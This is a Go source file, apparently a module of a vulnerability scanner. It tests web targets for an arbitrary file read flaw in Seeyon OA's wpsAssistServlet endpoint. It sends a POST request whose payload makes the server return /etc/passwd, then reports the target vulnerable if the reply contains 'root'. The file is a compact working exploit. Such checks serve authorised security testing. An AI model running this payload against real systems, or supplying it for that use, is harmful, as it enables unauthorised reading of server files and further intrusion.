package A8_file_load

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	vulnUrl := url + "/seeyon/wpsAssistServlet"
	data := "flag=template&templateUrl=/etc/passwd"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":   UA,
			"Content-Type": "application/x-www-form-urlencoded",
		}).
		SetBodyString(data).
		Post(vulnUrl)

	if err == nil && resp.StatusCode == 200 {
		// Check if the response body contains "[]"
		return strings.Contains(resp.String(), "root")
	}
	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		color.Green.Println("[+]	致远互联-OA wpsAssistServlet 任意文件读取漏洞存在linux 环境 -> ", url)
	} else {
		color.Red.Println("[-]	致远互联-OA wpsAssistServlet 任意文件读取漏洞不存在Linux 环境")
	}
}
